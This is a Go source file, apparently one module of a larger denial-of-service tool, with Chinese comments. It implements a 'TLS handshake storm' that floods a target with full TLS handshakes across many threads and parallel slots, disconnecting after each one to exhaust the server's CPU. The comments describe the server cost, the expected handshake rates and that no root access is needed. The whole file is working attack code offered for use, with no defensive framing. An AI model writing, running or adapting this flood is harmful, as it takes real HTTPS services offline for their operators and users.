package attack

import (
	"crypto/tls"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================
// TLS 握手风暴（SSL DoS）：
// 海量完整 TLS 握手（ECDHE 密钥交换）——目标每处理一个握手都要做
// 椭圆曲线计算 + 证书解析 + 会话管理，是 HTTPS 服务最昂贵的单操作之一。
// 握手完成后立即断开重连（不发送任何应用数据）。
//
// 特征：CPU 消耗型，仅对 TLS 目标（https/443）有意义；握手速率受
// RTT 限制（每连接必须等 ServerHello 完成），内网 2ms 下每槽每秒
// ~500 握手，低延迟场景是主场（与 tcp_connect 同性质）。
// 普通 TCP 连接即可（非 root 可用）。
// ============================================================

// tlsHandshakeSlotsPerThread 每线程握手槽数（并行隐藏 dial RTT）
const tlsHandshakeSlotsPerThread = 6

// StartTLSHandshakeEx TLS 握手风暴：method=tls_handshake。
// PacketSize 无意义；目标默认端口 443（无端口时）。
func StartTLSHandshakeEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "tls_handshake", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 20
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()
				endTime := time.Now().Add(dur)
				var targetIdx uint64

				var slotWG sync.WaitGroup
				for slot := 0; slot < tlsHandshakeSlotsPerThread; slot++ {
					slotWG.Add(1)
					go func() {
						defer slotWG.Done()
						tc := newTimeCache()

						for tc.since(endTime) < 0 {
							select {
							case <-s.StopChan:
								return
							default:
							}

							tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
							host, port := tlsTargetHostPort(tgt)
							addr := net.JoinHostPort(host, port)

							// TCP 连接 + 完整 TLS 握手，完成后立即断开
							conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
							if err != nil {
								atomic.AddUint64(&s.Stats.Errors, 1)
								time.Sleep(50 * time.Millisecond)
								continue
							}
							if !s.checkRate(200) { // 握手包约 200B
								conn.Close()
								time.Sleep(time.Microsecond * 100)
								continue
							}

							tlsConn := tls.Client(conn, &tls.Config{
								InsecureSkipVerify: true,
								ServerName:         host,
								MinVersion:         tls.VersionTLS12,
							})
							conn.SetDeadline(time.Now().Add(5 * time.Second))
							err = tlsConn.Handshake()
							tlsConn.Close()
							if err != nil {
								// 握手失败（目标非 TLS/版本拒绝/防护断连）：计数并继续
								atomic.AddUint64(&s.Stats.Errors, 1)
								continue
							}
							atomic.AddUint64(&s.Stats.PacketsSent, 1)
							atomic.AddUint64(&s.Stats.BytesSent, 200)
							tc.refresh()
						}
					}()
				}
				slotWG.Wait()
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

// tlsTargetHostPort 从目标串解析 host:port（无端口默认 443，剥离 URL scheme）
func tlsTargetHostPort(tgt string) (string, string) {
	if strings.HasPrefix(tgt, "http://") || strings.HasPrefix(tgt, "https://") {
		if u, err := url.Parse(tgt); err == nil && u.Host != "" {
			tgt = u.Host
		}
	}
	if h, p, err := net.SplitHostPort(tgt); err == nil {
		return h, p
	}
	return tgt, "443"
}
